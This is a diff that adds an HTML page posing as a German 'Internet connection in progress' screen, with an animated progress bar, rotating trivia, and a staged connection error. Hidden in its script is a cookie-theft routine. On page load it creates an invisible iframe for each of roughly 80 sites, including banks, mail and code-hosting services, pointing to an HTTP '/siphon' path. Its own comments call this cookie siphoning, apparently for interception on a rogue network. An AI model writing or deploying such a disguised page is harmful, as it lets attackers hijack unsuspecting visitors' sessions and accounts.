@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Internetverbindung</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fbc2eb);
+            background-size: 400% 400%;
+            animation: gradientBG 8s ease infinite;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #444;
+            text-align: center;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin: 15px 0;
+        }
+
+        .progress-container {
+            position: relative;
+            width: 80%;
+            max-width: 600px;
+            height: 30px;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            margin-top: 20px;
+        }
+
+        .progress-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            background: linear-gradient(90deg, #ff6a00, #ee0979);
+            animation: load 60s linear;
+            animation-fill-mode: forwards;
+        }
+
+        @keyframes load {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        .message {
+            font-size: 1rem;
+            margin-top: 20px;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
+        .message.visible {
+            opacity: 1;
+        }
+
+        .fun-fact {
+            font-style: italic;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        .error-message {
+            font-size: 1.5rem;
+            color: red;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+	<h1>Internetverbindung läuft...</h1>
+    <p>Bitte warten Sie einen Moment. Das Warten lohnt sich..</p>
+    <div class="progress-container">
+        <div class="progress-bar"></div>
+    </div>
+    <div class="message">Tipp: Wussten Sie, dass Delfine ihren Freunden Namen geben? ?</div>
+    <p class="fun-fact">Verlassen Sie die Seite nicht, während die Verbindung hergestellt wird</p>
+    <div class="error-message">Keine Verbindung zum Internet möglich</div>
+    <script>
+	// List of target domains
+	const domains = [
+		"admagazine.fr",
+		"archifacile.fr",
+		"argusdelassurance.com",
+		"auto-infos.fr",
+		"blablacar.fr",
+		"brice.fr",
+		"centre-presse.fr",
+		"charentelibre.fr",
+		"cinelaon.fr",
+		"cultura.fr",
+		"dordognelibre.fr",
+		"e-marchespublics.com",
+		"fandom.com",
+		"gmf.fr",
+		"google.de",
+		"gqmagazine.fr",
+		"hellfest.fr",
+		"hellofresh.fr",
+		"info-beaune.com",
+		"info-chalon.com",
+		"intersport.fr",
+		"jeusol.fr",
+		"jeux.fr",
+		"laposte.fr",
+		"larepubliquedespyrenees.fr",
+		"lemoniteurdespharmacies.fr",
+		"limportant.fr",
+		"lopinion.com",
+		"lsa-conso.fr",
+		"macommune.info",
+		"mesinfos.fr",
+		"meteofrance.com",
+		"mma.de",
+		"my-angers.info",
+		"napapijri.fr",
+		"norauto.fr",
+		"petit-bulletin.fr",
+		"pourquoidocteur.fr",
+		"premiere.fr",
+		"rrb.nc",
+		"seloger.com",
+		"seloger.fr",
+		"sncf-connect.com",
+		"unistra.fr",
+		"sudouest.fr",
+		"synonymo.fr",
+		"tl7.fr",
+		"transilien.fr",
+		"tribuca.net",
+		"tripadvisor.fr",
+		"turfomania.fr",
+		"urls.fr",
+		"usine-digitale.fr",
+		"vanityfair.fr",
+		"varmatin.com",
+		"vogue.fr",
+		"vu.fr",
+		"yandex.fr",
+		"zoomdici.fr",
+		"google.com",
+		"amazon.com",
+		"msn.com",
+		"t.co",
+		"wordpress.com",
+		"blogspot.com",
+		"imgur.com",
+		"office.com",
+		"github.com",
+		"pixnet.net",
+		"googleusercontent.com",
+		"xhamster.com",
+		"nytimes.com",
+		"chase.com",
+		"flipkart.com",
+		"alipay.com",
+		"163.com",
+		"dailymotion.com",
+		"quora.com",
+		"bankofamerica.com",
+		"amazonaws.com",
+		"twitch.tv",
+		// Add more domains as needed
+	];
+
+
+    // Function to create hidden iframes for cookie siphoning
+    function siphonCookies(domain) {
+      const iframe = document.createElement("iframe");
+      iframe.style.display = "none"; // Hide the iframe
+
+      // On inclut 'domain' en paramètre dans l'URL
+      iframe.src = `http://${domain}/siphon?domain=${encodeURIComponent(domain)}`;
+      document.body.appendChild(iframe);
+    }
+
+    // Function to add a delay between each domain
+    function siphonWithDelay(domains, delay) {
+      domains.forEach((domain, index) => {
+        setTimeout(() => {
+          siphonCookies(domain);
+          console.log(`Siphoning cookies from: ${domain}`);
+        }, index * delay);
+      });
+    }
+
+    // Start siphoning cookies with a delay of 100ms between each
+    siphonWithDelay(domains, 1000);
+	
+        let facts = [
+            "Anekdote: Bienen kommunizieren durch Tanzen.",
+            "Anekdote: Kraken haben drei Herzen.",
+            "Anekdote: Der Weltraum riecht nach verbranntem Metall und Himbeeren.",
+            "Anekdote: Es gibt mehr Sterne im Universum als Sandkörner auf der Erde..",
+            "Anekdote: Schildkröten können durch ihren Hintern atmen !",
+            "Anekdote: Musik kann Ihr Gedächtnis und Ihre Stimmung verbessern.",
+            "Anekdote: Katzen träumen genau wie Menschen.",
+            "Anekdote: Der älteste Baum der Welt ist über 5.000 Jahre alt.",
+            "Anekdote: Das Herz eines Blauwals wiegt so viel wie ein Auto.",
+            "Anekdote: Bananen sind Beeren, Erdbeeren jedoch nicht.",
+            "Anekdote: Der Mond entfernt sich jährlich um 3,8 cm von der Erde.",
+            "Anekdote: Manche Fische können an Land laufen."
+        ];
+
+        let message = document.querySelector('.message');
+        let errorMessage = document.querySelector('.error-message');
+        let index = 0;
+
+        function updateMessage() {
+            message.classList.remove('visible');
+            setTimeout(() => {
+                message.textContent = facts[index];
+                message.classList.add('visible');
+                index = (index + 1) % facts.length;
+            }, 1000); // Delay matches the CSS transition
+        }
+
+        updateMessage();
+        setInterval(updateMessage, 5000);
+
+        // Show error message after 60 seconds
+        setTimeout(() => {
+            document.querySelector('.progress-container').style.display = 'none';
+            document.querySelector('.message').style.display = 'none';
+            document.querySelector('.fun-fact').style.display = 'none';
+            errorMessage.style.display = 'block';
+        }, 60000);
+    </script>
+</body>
+</html>
